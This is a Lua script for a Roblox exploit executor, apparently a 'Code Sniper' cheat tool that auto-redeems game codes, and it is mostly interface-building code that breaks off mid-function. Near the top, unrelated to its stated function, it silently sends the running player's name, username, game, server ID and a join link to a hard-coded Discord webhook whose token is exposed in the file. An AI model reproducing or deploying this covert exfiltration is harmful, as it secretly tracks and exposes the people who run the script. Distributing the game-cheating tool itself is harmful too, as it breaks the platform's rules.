--[[

  /$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$      |_  $$_/ /$$__  $$| $$_____/| $$__  $$
| $$  \__/| $$        | $$  | $$  \__/| $$      | $$  \ $$
|  $$$$$$ | $$        | $$  | $$      | $$$$$   | $$  | $$
 \____  $$| $$        | $$  | $$      | $$__/   | $$  | $$
 /$$  \ $$| $$        | $$  | $$    $$| $$      | $$  | $$
|  $$$$$$/| $$$$$$$$ /$$$$$$|  $$$$$$/| $$$$$$$$| $$$$$$$/
 \______/ |________/|______/ \______/ |________/|_______/

]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local LocalPlayer = Players.LocalPlayer

-- Webhook configuration & deep join link
local webhookUrl = "https://discord.com/api/webhooks/1529215666534481940/T63O8GwtiF4lkqBYewcyXr9-Q-pYRNJ7O3NMeTWPLW3u_iD4PsMdiy9PTBfyYsxjesYr"

local gameName = "Roblox Game"
pcall(function()
	local info = MarketplaceService:GetProductInfo(game.PlaceId)
	if info and info.Name then
		gameName = info.Name
	end
end)
local joinLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)

task.spawn(function()
	local reqFunc = (syn and syn.request) or (http and http.request) or request or http_request
	local payload = {
		["content"] = "",
		["embeds"] = {{
			["title"] = "🚀 Code Sniper Execution Log",
			["description"] = string.format(
				"**User:** %s (@%s)\n**Game:** %s\n**Place ID:** %d\n**Job ID:** `%s`\n\n[🔗 Click to Join Server](%s)", 
				LocalPlayer.DisplayName, 
				LocalPlayer.Name, 
				gameName, 
				game.PlaceId, 
				game.JobId, 
				joinLink
			),
			["color"] = 65280,
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}
	local jsonPayload = HttpService:JSONEncode(payload)
	if reqFunc then
		pcall(function()
			reqFunc({
				Url = webhookUrl,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = jsonPayload
			})
		end)
	else
		pcall(function()
			HttpService:PostAsync(webhookUrl, jsonPayload)
		end)
	end
end)

local tbl = {
	display = "ReplicatedStorage.Packages.Net (auto-scanning for Top banner)",
	shortName = "Net (Shape detection)",
	resolve = function()
		local packages = ReplicatedStorage:WaitForChild("Packages", 20)
		if not packages then return nil end
		return packages:WaitForChild("Net", 20)
	end,
}

local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")

if getgenv then getgenv().__VECS_UI_TOKEN = (getgenv().__VECS_UI_TOKEN or 0) + 1 end

local vecsUiToken = getgenv and getgenv().__VECS_UI_TOKEN or 1

local function fn() return not getgenv or getgenv().__VECS_UI_TOKEN == vecsUiToken end

local tbl2 = {
	text = Color3.fromHex("#FFFFFF"),
	placeholder = Color3.fromHex("#E0C1FF"),
	accentMid = Color3.fromHex("#BC78FF"),
	accentLo = Color3.fromHex("#8436D9"),
	accentHi = Color3.fromHex("#54208A"),
	outlineMid = Color3.fromHex("#BA75F5"),
	macRed = Color3.fromHex("#FF5F57"),
	macYellow = Color3.fromHex("#FEBC2E"),
	macGreen = Color3.fromHex("#28C840"),
	fps = Color3.fromRGB(242, 170, 58),
	ping = Color3.fromRGB(70, 224, 140),
	green = Color3.fromRGB(70, 224, 140),
	red = Color3.fromRGB(255, 86, 102),
	yellow = Color3.fromRGB(255, 196, 72),
	panel = Color3.fromHex("#2A1145"),
	card = Color3.fromHex("#241032"),
	buttonDark = Color3.fromHex("#30123F"),
	ink = Color3.fromHex("#12071E"),
}

local card = tbl2.card
local outlineMid = tbl2.outlineMid
tbl2.BG = tbl2.panel
tbl2.Card = card
tbl2.Border = outlineMid
local green = tbl2.green
local red = tbl2.red
tbl2.Accent = tbl2.accentMid
tbl2.Green = green
tbl2.Red = red
local text = tbl2.text
local placeholder = tbl2.placeholder
tbl2.Yellow = tbl2.yellow
tbl2.White = text
tbl2.Dim = placeholder

local function slicedfn2(arg, arg2, arg3)
	local ok, result = pcall(TweenService.Create, TweenService, arg, arg2, arg3)
	if ok and result then result:Play() end
end

local function createUICorner(parent, arg)
	local uiCorner = Instance.new("UICorner")
	uiCorner.CornerRadius = UDim.new(0, arg or 10)
	uiCorner.Parent = parent
	return uiCorner
end

local function createUIStroke(parent, color, thickness, transparency)
	local uiStroke = Instance.new("UIStroke")
	uiStroke.Color = color or tbl2.outlineMid
	uiStroke.Thickness = thickness or 1
	uiStroke.Transparency = transparency or 0
	uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	uiStroke.Parent = parent
	return uiStroke
end

local function createUIPadding(parent, arg, arg2, arg3, arg4)
	local uiPadding = Instance.new("UIPadding")
	uiPadding.PaddingTop = UDim.new(0, arg or 0)
	uiPadding.PaddingBottom = UDim.new(0, arg2 or 0)
	uiPadding.PaddingLeft = UDim.new(0, arg3 or 0)
	uiPadding.PaddingRight = UDim.new(0, arg4 or 0)
	uiPadding.Parent = parent
	return uiPadding
end

local function createUIGradient(parent, arg, rotation)
	local tbl3 = {}
	local tbl4 = {}
	for _, v in ipairs(arg) do
		tbl3[#tbl3 + 1] = ColorSequenceKeypoint.new(v[1], Color3.fromHex(v[2]))
		tbl4[#tbl4 + 1] = NumberSequenceKeypoint.new(v[1], v[3] or 0)
	end
	local uiGradient = Instance.new("UIGradient")
	uiGradient.Color = ColorSequence.new(tbl3)
	uiGradient.Transparency = NumberSequence.new(tbl4)
	uiGradient.Rotation = rotation or 0
	uiGradient.Parent = parent
	return uiGradient
end

local function slicedfn3(arg) return createUIGradient(arg, { { 0, "#8436D9" }, { 0.5, "#BC78FF" }, { 1, "#54208A" } }, 45) end

local function slicedfn4(arg) return createUIGradient(arg, { { 0, "#8141B5", 0.45 }, { 0.5, "#BA75F5", 0.22 }, { 1, "#642F95", 0.42 } }, 90) end

local function slicedfn5(arg) return createUIGradient(arg, { { 0, "#371449", 0.72 }, { 0.5, "#9750D8", 0.61 }, { 1, "#241032", 0.74 } }, 90) end

local function slicedfn6(arg)
	return createUIGradient(arg, {
		{ 0, "#170927", 0.06 },
		{ 0.25, "#291043", 0.08 },
		{ 0.5, "#3D185F", 0.1 },
		{ 0.75, "#50227A", 0.12 },
		{ 1, "#12071E", 0.06 },
	}, 135)
end

local function slicedfn7()
	local ok, result = pcall(function()
		return gethui()
	end)
	if ok and typeof(result) == "Instance" then return result end
	local ok2, result2 = pcall(function()
		return game:GetService("CoreGui")
	end)
	if ok2 and typeof(result2) == "Instance" then return result2 end
	return nil
end

local v = slicedfn7()

if not v then return end

local function slicedfn8(arg)
	if pcall(function()
		arg.Parent = v
	end) then
		return true
	end
	local ok, parent = pcall(function()
		return game:GetService("CoreGui")
	end)
	if ok and typeof(parent) == "Instance" and pcall(function()
		arg.Parent = parent
	end) then
		return true
	end
	return false
end

for _, sliced2 in ipairs({ playerGui, v }) do
	for _, sliced3 in ipairs({
		"remote waiter",
		"voidexternal code sniper",
		"voidexternal code sniper no ai",
		"tptptp code sniper mobile",
	}) do
		pcall(function()
			local sliced4 = sliced2:FindFirstChild(sliced3)
			if sliced4 then sliced4:Destroy() end
		end)
	end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "voidexternal code sniper no ai"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

if not slicedfn8(screenGui) then
	screenGui:Destroy()
	return
end

local screenGui2 = Instance.new("ScreenGui")
screenGui2.Name = "tptptp code sniper mobile"
screenGui2.ResetOnSpawn = false
screenGui2.IgnoreGuiInset = true
screenGui2.DisplayOrder = 10000
screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

if not slicedfn8(screenGui2) then
	screenGui2:Destroy()
	screenGui:Destroy()
	return
end

local textButton = Instance.new("TextButton")
textButton.Name = "MobileOpen"
textButton.AnchorPoint = Vector2.new(1, 1)
textButton.Position = UDim2.new(1, -14, 1, -14)
textButton.Size = UDim2.fromOffset(58, 58)
textButton.BackgroundColor3 = tbl2.panel
textButton.BackgroundTransparency = 0.12
textButton.BorderSizePixel = 0
textButton.AutoButtonColor = false
textButton.Font = Enum.Font.GothamBlack
textButton.Text = "CS"
textButton.TextSize = 15
textButton.TextColor3 = tbl2.text
textButton.Visible = UserInputService.TouchEnabled
textButton.Parent = screenGui2
createUICorner(textButton, 18)
slicedfn6(textButton)
local sliced2 = createUIStroke(textButton, tbl2.outlineMid, 1.4, 0.18)
slicedfn4(sliced2)
local n = 382
local slicedn2 = 552
local slicedn3 = 44
local frame = Instance.new("Frame")
frame.Name = "Window"
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.Position = UDim2.new(0.5, 0, 0.47, -slicedn2 / 2)
frame.Size = UDim2.fromOffset(382, 552)
frame.BackgroundColor3 = tbl2.panel
frame.BackgroundTransparency = 0.35
frame.BorderSizePixel = 0
frame.ClipsDescendants = false
frame.Parent = screenGui
local uiScale = Instance.new("UIScale")
uiScale.Scale = 1
uiScale.Parent = frame
createUICorner(frame, 14)
slicedfn6(frame)
local sliced3 = createUIStroke(frame, tbl2.outlineMid, 1.4, 0.08)
slicedfn4(sliced3)
local sliced4 = createUIStroke(frame, tbl2.Accent, 1.05, 0.28)
local imageLabel = Instance.new("ImageLabel")
imageLabel.Name = "Shadow"
imageLabel.ZIndex = 0
imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
imageLabel.Position = UDim2.new(0.5, 0, 0.5, 4)
imageLabel.Size = UDim2.new(1, 48, 1, 48)
imageLabel.BackgroundTransparency = 1
imageLabel.Image = "rbxassetid://6014261993"
imageLabel.ImageColor3 = Color3.fromHex("#0B0413")
imageLabel.ImageTransparency = 0.22
imageLabel.ScaleType = Enum.ScaleType.Slice
imageLabel.SliceCenter = Rect.new(49, 49, 450, 450)
imageLabel.Parent = frame
local frame2 = Instance.new("Frame")
frame2.Name = "Topbar"
frame2.Size = UDim2.new(1, 0, 0, 44)
frame2.BackgroundTransparency = 1
frame2.Active = true
frame2.Parent = frame

local function createFrame(arg, backgroundColor3, arg2)
	local frame3 = Instance.new("Frame")
	frame3.AnchorPoint = Vector2.new(0, 0.5)
	frame3.Position = UDim2.new(0, arg, 0.5, 0)
	frame3.Size = UDim2.fromOffset(12, 12)
	frame3.BackgroundColor3 = backgroundColor3
	frame3.BackgroundTransparency = arg2 and 0.55 or 0
	frame3.BorderSizePixel = 0
	frame3.Parent = frame2
	createUICorner(frame3, 6)
	return frame3
end

createFrame(16, tbl2.macRed, false)
createFrame(36, tbl2.macYellow, false)
createFrame(56, tbl2.macGreen, true)
local textButton2 = Instance.new("TextButton")
textButton2.Name = "Close"
textButton2.AnchorPoint = Vector2.new(0, 0.5)
textButton2.Position = UDim2.new(0, 10, 0.5, 0)
textButton2.Size = UDim2.fromOffset(24, 24)
textButton2.BackgroundTransparency = 1
textButton2.BorderSizePixel = 0
textButton2.AutoButtonColor = false
textButton2.Text = ""
textButton2.Parent = frame2
local textButton3 = Instance.new("TextButton")
textButton3.Name = "Minimize"
textButton3.AnchorPoint = Vector2.new(1, 0.5)
textButton3.Position = UDim2.new(1, -10, 0.5, 0)
textButton3.Size = UDim2.fromOffset(30, 28)
textButton3.BackgroundTransparency = 1
textButton3.BorderSizePixel = 0
textButton3.AutoButtonColor = false
textButton3.Font = Enum.Font.GothamBlack
textButton3.Text = "-"
textButton3.TextSize = 19
textButton3.TextColor3 = tbl2.macYellow
textButton3.ZIndex = 4
textButton3.Parent = frame2
local textLabel = Instance.new("TextLabel")
textLabel.Name = "Title"
textLabel.Position = UDim2.new(0, 84, 0, 0)
textLabel.Size = UDim2.new(1, -132, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Font = Enum.Font.GothamBold
textLabel.Text = "Code Sniper"
textLabel.TextSize = 15
textLabel.TextColor3 = tbl2.text
textLabel.TextXAlignment = Enum.TextXAlignment.Left
textLabel.Parent = frame2
local frame3 = Instance.new("Frame")
frame3.Name = "Content"
frame3.Position = UDim2.new(0, 0, 0, 44)
frame3.Size = UDim2.new(1, 0, 1, -slicedn3)
frame3.BackgroundTransparency = 1
frame3.Parent = frame
local frame4 = Instance.new("Frame")
frame4.Name = "Tabs"
frame4.Position = UDim2.fromOffset(12, 6)
frame4.Size = UDim2.new(1, -24, 0, 36)
frame4.BackgroundColor3 = tbl2.card
frame4.BackgroundTransparency = 0.34
frame4.BorderSizePixel = 0
frame4.Parent = frame3
createUICorner(frame4, 10)
createUIStroke(frame4, tbl2.outlineMid, 1, 0.62)

local function slicedfn9(name, text2, position)
	local textButton4 = Instance.new("TextButton")
	textButton4.Name = name
	textButton4.Position = position
	textButton4.Size = UDim2.new(0.5, -5, 1, -8)
	textButton4.BackgroundColor3 = tbl2.buttonDark
	textButton4.BackgroundTransparency = 0.18
	textButton4.BorderSizePixel = 0
	textButton4.AutoButtonColor = false
	textButton4.Font = Enum.Font.GothamBold
	textButton4.Text = text2
	textButton4.TextSize = 11
	textButton4.TextColor3 = tbl2.placeholder
	textButton4.Parent = frame4
	createUICorner(textButton4, 8)
	createUIStroke(textButton4, tbl2.outlineMid, 1, 0.68)
	local sliced5 = slicedfn3(textButton4)
	sliced5.Enabled = false
	return textButton4, sliced5
end

local MainTab, sliced5 = slicedfn9("MainTab", "MAIN", UDim2.fromOffset(4, 4))
local ConfigTab, sliced6 = slicedfn9("ConfigTab", "CONFIG", UDim2.new(0.5, 1, 0, 4))
local frame5 = Instance.new("Frame")
frame5.Name = "Pages"
frame5.Position = UDim2.fromOffset(8, 50)
frame5.Size = UDim2.new(1, -16, 1, -58)
frame5.BackgroundTransparency = 1
frame5.ClipsDescendants = true
frame5.Parent = frame3

local function createScrollingFrame(name)
	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Name = name
	scrollingFrame.Size = UDim2.fromScale(1, 1)
	scrollingFrame.BackgroundTransparency = 1
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.ScrollBarThickness = 3
	scrollingFrame.ScrollBarImageColor3 = tbl2.accentMid
	scrollingFrame.ScrollBarImageTransparency = 0.2
	scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
	scrollingFrame.CanvasSize = UDim2.new()
	scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
	scrollingFrame.Parent = frame5
	createUIPadding(scrollingFrame, 2, 12, 4, 8)
	local uiListLayout = Instance.new("UIListLayout")
	uiListLayout.Padding = UDim.new(0, 8)
	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	uiListLayout.Parent = scrollingFrame
	return scrollingFrame
end

local Main = createScrollingFrame("Main")
local Config = createScrollingFrame("Config")
Config.Visible = false

local function createFrame2(parent, arg, layoutOrder)
	local frame6 = Instance.new("Frame")
	frame6.BackgroundColor3 = tbl2.card
	frame6.BackgroundTransparency = 0.2
	frame6.BorderSizePixel = 0
	frame6.LayoutOrder = layoutOrder or 1
	frame6.Size = arg and UDim2.new(1, 0, 0, arg) or UDim2.new(1, 0, 0, 0)
	if not arg then frame6.AutomaticSize = Enum.AutomaticSize.Y end
	frame6.Parent = parent
	createUICorner(frame6, 10)
	slicedfn5(frame6)
	createUIStroke(frame6, tbl2.outlineMid, 1, 0.62)
	return frame6
end

local sliced7 = createFrame2(Main, 52, 1)
local frame6 = Instance.new("Frame")
frame6.Size = UDim2.fromOffset(10, 10)
frame6.Position = UDim2.new(0, 15, 0.5, -5)
frame6.BackgroundColor3 = tbl2.Yellow
frame6.BorderSizePixel = 0
frame6.Parent = sliced7
createUICorner(frame6, 5)
local textLabel2 = Instance.new("TextLabel")
textLabel2.BackgroundTransparency = 1
textLabel2.Position = UDim2.new(0, 35, 0, 0)
textLabel2.Size = UDim2.new(1, -49, 1, 0)
textLabel2.Text = "Starting..."
textLabel2.TextSize = 13
textLabel2.Font = Enum.Font.GothamBold
textLabel2.TextColor3 = tbl2.Yellow
textLabel2.TextXAlignment = Enum.TextXAlignment.Left
textLabel2.TextTruncate = Enum.TextTruncate.AtEnd
textLabel2.Parent = sliced7
local sliced8 = createFrame2(Main, nil, 2)
createUIPadding(sliced8, 11, 11, 11, 11)
local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Padding = UDim.new(0, 8)
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Parent = sliced8

local function createFrame3(layoutOrder, arg)
	local frame7 = Instance.new("Frame")
	frame7.BackgroundColor3 = tbl2.ink
	frame7.BackgroundTransparency = 0.52
	frame7.BorderSizePixel = 0
	frame7.Size = UDim2.new(1, 0, 0, arg or 42)
	frame7.LayoutOrder = layoutOrder
	frame7.Parent = sliced8
	createUICorner(frame7, 9)
	createUIStroke(frame7, tbl2.outlineMid, 1, 0.76)
	return frame7
end

local function createTextLabel(parent, text2, text3)
	local textLabel3 = Instance.new("TextLabel")
	textLabel3.BackgroundTransparency = 1
	textLabel3.Position = UDim2.new(0, 12, 0, text3 and 4 or 0)
	textLabel3.Size = UDim2.new(0.4, -8, text3 and 0.55 or 1, 0)
	textLabel3.Text = text2
	textLabel3.TextSize = 11
	textLabel3.Font = Enum.Font.GothamBold
	textLabel3.TextColor3 = tbl2.text
	textLabel3.TextXAlignment = Enum.TextXAlignment.Left
	textLabel3.TextTruncate = Enum.TextTruncate.AtEnd
	textLabel3.Parent = parent
	if text3 then
		local textLabel4 = Instance.new("TextLabel")
		textLabel4.BackgroundTransparency = 1
		textLabel4.Position = UDim2.new(0, 12, 0.52, -2)
		textLabel4.Size = UDim2.new(0.4, -8, 0.42, 0)
		textLabel4.Text = text3
		textLabel4.TextSize = 9
		textLabel4.Font = Enum.Font.Gotham
		textLabel4.TextColor3 = tbl2.placeholder
		textLabel4.TextTransparency = 0.22
		textLabel4.TextXAlignment = Enum.TextXAlignment.Left
		textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
		textLabel4.Parent = parent
	end
	return textLabel3
end

local function createTextButton(parent, arg, arg2, text2, backgroundColor3, textColor3)
	local textButton4 = Instance.new("TextButton")
	textButton4.AnchorPoint = Vector2.new(1, 0.5)
	textButton4.Position = UDim2.new(1, arg2, 0.5, 0)
	textButton4.Size = UDim2.fromOffset(arg, 26)
	textButton4.BackgroundColor3 = backgroundColor3 or tbl2.buttonDark
	textButton4.BackgroundTransparency = 0.05
	textButton4.BorderSizePixel = 0
	textButton4.AutoButtonColor = false
	textButton4.Font = Enum.Font.GothamBold
	textButton4.Text = text2
	textButton4.TextSize = 10
	textButton4.TextColor3 = textColor3 or tbl2.text
	textButton4.Parent = parent
	createUICorner(textButton4, 8)
	createUIStroke(textButton4, tbl2.outlineMid, 1, 0.58)
	return textButton4
end

local function createTextLabel2(parent, arg, arg2, text2)
	local textLabel3 = Instance.new("TextLabel")
	textLabel3.AnchorPoint = Vector2.new(1, 0.5)
	textLabel3.Position = UDim2.new(1, arg2, 0.5, 0)
	textLabel3.Size = UDim2.fromOffset(arg, 26)
	textLabel3.BackgroundColor3 = tbl2.ink
	textLabel3.BackgroundTransparency = 0.16
	textLabel3.BorderSizePixel = 0
	textLabel3.Font = Enum.Font.GothamBold
	textLabel3.Text = text2
	textLabel3.TextSize = 10
	textLabel3.TextColor3 = tbl2.text
	textLabel3.Parent = parent
	createUICorner(textLabel3, 8)
	createUIStroke(textLabel3, tbl2.outlineMid, 1, 0.68)
	return textLabel3
end

local sliced9 = createFrame3(1, 44)
createTextLabel(sliced9, "Auto Redeem", "Submit detected Top codes")
local on = createTextButton(sliced9, 58, -10, "ON", tbl2.Green, tbl2.ink)
local sliced10 = createFrame3(2, 44)
createTextLabel(sliced10, "Submit Delay", "Optional fragment buffer")
local sliced11 = createTextButton(sliced10, 28, -10, "+", tbl2.Accent, tbl2.ink)
local sliced12 = createTextLabel2(sliced10, 56, -44, "0.2s")
local sliced13 = createTextButton(sliced10, 28, -106, "-", tbl2.Accent, tbl2.ink)
local off = createTextButton(sliced10, 52, -140, "OFF", tbl2.Red, tbl2.White)
local textLabel3 = Instance.new("TextLabel")
textLabel3.BackgroundTransparency = 1
textLabel3.Size = UDim2.new(1, 0, 0, 15)
textLabel3.LayoutOrder = 3
textLabel3.Text = "CODE FORMATTING"
textLabel3.TextSize = 9
textLabel3.Font = Enum.Font.GothamBlack
textLabel3.TextColor3 = tbl2.placeholder
textLabel3.TextTransparency = 0.15
textLabel3.TextXAlignment = Enum.TextXAlignment.Left
textLabel3.Parent = sliced8
local frame7 = Instance.new("Frame")
frame7.BackgroundColor3 = tbl2.ink
frame7.BackgroundTransparency = 0.52
frame7.BorderSizePixel = 0
frame7.Size = UDim2.new(1, 0, 0, 36)
frame7.LayoutOrder = 4
frame7.Parent = sliced8
createUICorner(frame7, 9)
createUIStroke(frame7, tbl2.outlineMid, 1, 0.76)
createUIPadding(frame7, 5, 5, 5, 5)

local function createTextButton2(arg, text2)
	local textButton4 = Instance.new("TextButton")
	textButton4.Size = UDim2.new(0.32, 0, 1, 0)
	textButton4.Position = UDim2.new(arg, 0, 0, 0)
	textButton4.BackgroundColor3 = tbl2.buttonDark
	textButton4.BackgroundTransparency = 0.08
	textButton4.BorderSizePixel = 0
	textButton4.AutoButtonColor = false
	textButton4.Font = Enum.Font.GothamBold
	textButton4.Text = text2
	textButton4.TextSize = 10
	textButton4.TextColor3 = tbl2.Dim
	textButton4.Parent = frame7
	createUICorner(textButton4, 7)
	createUIStroke(textButton4, tbl2.outlineMid, 1, 0.72)
	return textButton4
end

local normal = createTextButton2(0, "Normal")
local upper = createTextButton2(0.34, "UPPER")
local sliced14 = createTextButton2(0.68, "lower")
local sliced15 = createFrame3(5, 44)
createTextLabel(sliced15, "Word Submit", "Wait for a word count")
local sliced16 = createTextButton(sliced15, 28, -10, "+", tbl2.Accent, tbl2.ink)
local sliced17 = createTextLabel2(sliced15, 40, -44, "1")
local sliced18 = createTextButton(sliced15, 28, -90, "-", tbl2.Accent, tbl2.ink)
local off2 = createTextButton(sliced15, 52, -124, "OFF", tbl2.Red, tbl2.White)
local textButton4 = Instance.new("TextButton")
textButton4.Size = UDim2.new(1, 0, 0, 38)
textButton4.LayoutOrder = 6
textButton4.BackgroundColor3 = tbl2.accentLo
textButton4.BackgroundTransparency = 0.03
textButton4.BorderSizePixel = 0
textButton4.AutoButtonColor = false
textButton4.Font = Enum.Font.GothamBlack
textButton4.Text = "SUBMIT NOW"
textButton4.TextSize = 12
textButton4.TextColor3 = tbl2.text
textButton4.Parent = sliced8
createUICorner(textButton4, 10)
slicedfn3(textButton4)
createUIStroke(textButton4, tbl2.outlineMid, 1, 0.3)
local frame8 = Instance.new("Frame")
frame8.BackgroundColor3 = tbl2.ink
frame8.BackgroundTransparency = 0.38
frame8.BorderSizePixel = 0
frame8.Size = UDim2.new(1, 0, 0, 0)
frame8.AutomaticSize = Enum.AutomaticSize.Y
frame8.LayoutOrder = 7
frame8.Parent = sliced8
createUICorner(frame8, 9)
createUIStroke(frame8, tbl2.outlineMid, 1, 0.74)
createUIPadding(frame8, 9, 9, 10, 10)
local uiListLayout2 = Instance.new("UIListLayout")
uiListLayout2.Padding = UDim.new(0, 5)
uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout2.Parent = frame8
local textLabel4 = Instance.new("TextLabel")
textLabel4.BackgroundTransparency = 1
textLabel4.Size = UDim2.new(1, 0, 0, 0)
textLabel4.AutomaticSize = Enum.AutomaticSize.Y
textLabel4.LayoutOrder = 1
textLabel4.Text = "idle"
textLabel4.TextSize = 12
textLabel4.Font = Enum.Font.Code
textLabel4.TextColor3 = tbl2.Dim
textLabel4.TextXAlignment = Enum.TextXAlignment.Left
textLabel4.TextWrapped = true
textLabel4.Parent = frame8
local textLabel5 = Instance.new("TextLabel")
textLabel5.BackgroundTransparency = 1
textLabel5.Size = UDim2.new(1, 0, 0, 0)
textLabel5.AutomaticSize = Enum.AutomaticSize.Y
textLabel5.LayoutOrder = 2
textLabel5.Text = "STOPWATCH: --"
textLabel5.TextSize = 10
textLabel5.Font = Enum.Font.Code
textLabel5.TextColor3 = tbl2.Dim
textLabel5.TextXAlignment = Enum.TextXAlignment.Left
textLabel5.TextWrapped = true
textLabel5.Parent = frame8
local sliced19 = createFrame2(Config, nil, 1)
createUIPadding(sliced19, 12, 12, 12, 12)
local uiListLayout3 = Instance.new("UIListLayout")
uiListLayout3.Padding = UDim.new(0, 9)
uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout3.Parent = sliced19
local textLabel6 = Instance.new("TextLabel")
textLabel6.BackgroundTransparency = 1
textLabel6.Size = UDim2.new(1, 0, 0, 21)
textLabel6.LayoutOrder = 1
textLabel6.Text = "KEYBINDS & MODE"
textLabel6.TextSize = 11
textLabel6.Font = Enum.Font.GothamBlack
textLabel6.TextColor3 = tbl2.Accent
textLabel6.TextXAlignment = Enum.TextXAlignment.Left
textLabel6.Parent = sliced19
local textLabel7 = Instance.new("TextLabel")
textLabel7.BackgroundTransparency = 1
textLabel7.Size = UDim2.new(1, 0, 0, 30)
textLabel7.LayoutOrder = 2
textLabel7.Text = "Tap a binding, then press a replacement key. Duplicate keys swap automatically."
textLabel7.TextSize = 10
textLabel7.Font = Enum.Font.Gotham
textLabel7.TextColor3 = tbl2.placeholder
textLabel7.TextTransparency = 0.18
textLabel7.TextWrapped = true
textLabel7.TextXAlignment = Enum.TextXAlignment.Left
textLabel7.Parent = sliced19

local function createTextButton3(layoutOrder, text2, text3)
	local frame9 = Instance.new("Frame")
	frame9.BackgroundColor3 = tbl2.ink
	frame9.BackgroundTransparency = 0.52
	frame9.BorderSizePixel = 0
	frame9.Size = UDim2.new(1, 0, 0, 46)
	frame9.LayoutOrder = layoutOrder
	frame9.Parent = sliced19
	createUICorner(frame9, 9)
	createUIStroke(frame9, tbl2.outlineMid, 1, 0.76)
	local textLabel8 = Instance.new("TextLabel")
	textLabel8.BackgroundTransparency = 1
	textLabel8.Position = UDim2.fromOffset(12, 0)
	textLabel8.Size = UDim2.new(1, -112, 1, 0)
	textLabel8.Text = text2
	textLabel8.TextSize = 11
	textLabel8.Font = Enum.Font.GothamBold
	textLabel8.TextColor3 = tbl2.White
	textLabel8.TextXAlignment = Enum.TextXAlignment.Left
	textLabel8.Parent = frame9
	local textButton5 = Instance.new("TextButton")
	textButton5.AnchorPoint = Vector2.new(1, 0.5)
	textButton5.Position = UDim2.new(1, -10, 0.5, 0)
	textButton5.Size = UDim2.fromOffset(88, 28)
	textButton5.BackgroundColor3 = tbl2.buttonDark
	textButton5.BackgroundTransparency = 0.08
	textButton5.BorderSizePixel = 0
	textButton5.AutoButtonColor = false
	textButton5.Font = Enum.Font.GothamBold
	textButton5.Text = text3
	textButton5.TextSize = 10
	textButton5.TextColor3 = tbl2.White
	textButton5.Parent = frame9
	createUICorner(textButton5, 8)
	createUIStroke(textButton5, tbl2.outlineMid, 1, 0.58)
	return textButton5
end

local toggleAutoRedeem = createTextButton3(3, "Toggle auto redeem", "P")
local resetCollectedWords = createTextButton3(4, "Reset collected words", "R")
local frame9 = Instance.new("Frame")
frame9.BackgroundColor3 = tbl2.ink
frame9.BackgroundTransparency = 0.52
frame9.BorderSizePixel = 0
frame9.Size = UDim2.new(1, 0, 0, 46)
frame9.LayoutOrder = 5
frame9.Parent = sliced19
createUICorner(frame9, 9)
createUIStroke(frame9, tbl2.outlineMid, 1, 0.76)
local textLabel8 = Instance.new("TextLabel")
textLabel8.BackgroundTransparency = 1
textLabel8.Position = UDim2.fromOffset(12, 0)
textLabel8.Size = UDim2.new(1, -112, 1, 0)
textLabel8.Text = "Redeem mode"
textLabel8.TextSize = 11
textLabel8.Font = Enum.Font.GothamBold
textLabel8.TextColor3 = tbl2.White
textLabel8.TextXAlignment = Enum.TextXAlignment.Left
textLabel8.Parent = frame9
local textButton5 = Instance.new("TextButton")
textButton5.AnchorPoint = Vector2.new(1, 0.5)
textButton5.Position = UDim2.new(1, -10, 0.5, 0)
textButton5.Size = UDim2.fromOffset(88, 28)
textButton5.BackgroundColor3 = tbl2.Green
textButton5.BackgroundTransparency = 0.05
textButton5.BorderSizePixel = 0
textButton5.AutoButtonColor = false
textButton5.Font = Enum.Font.GothamBold
textButton5.Text = "AUTO"
textButton5.TextSize = 10
textButton5.TextColor3 = tbl2.ink
textButton5.Parent = frame9
createUICorner(textButton5, 8)
createUIStroke(textButton5, tbl2.outlineMid, 1, 0.58)
local textLabel9 = Instance.new("TextLabel")
textLabel9.BackgroundColor3 = tbl2.ink
textLabel9.BackgroundTransparency = 0.52
textLabel9.BorderSizePixel = 0
textLabel9.Size = UDim2.new(1, 0, 0, 0)
textLabel9.AutomaticSize = Enum.AutomaticSize.Y
textLabel9.LayoutOrder = 6
textLabel9.Text = "Click a key, then press the new key. ESC cancels."
textLabel9.TextSize = 10
textLabel9.Font = Enum.Font.Gotham
textLabel9.TextColor3 = tbl2.Dim
textLabel9.TextWrapped = true
textLabel9.TextXAlignment = Enum.TextXAlignment.Left
textLabel9.Parent = sliced19
createUICorner(textLabel9, 9)
createUIStroke(textLabel9, tbl2.outlineMid, 1, 0.76)
createUIPadding(textLabel9, 10, 10, 11, 11)

local function slicedfn10(arg, arg2, enabled)
	arg2.Enabled = enabled
	arg.BackgroundColor3 = enabled and tbl2.accentLo or tbl2.buttonDark
	arg.BackgroundTransparency = enabled and 0.02 or 0.18
	arg.TextColor3 = enabled and tbl2.text or tbl2.placeholder
end

local function slicedfn11(visible)
	local visible2 = not visible
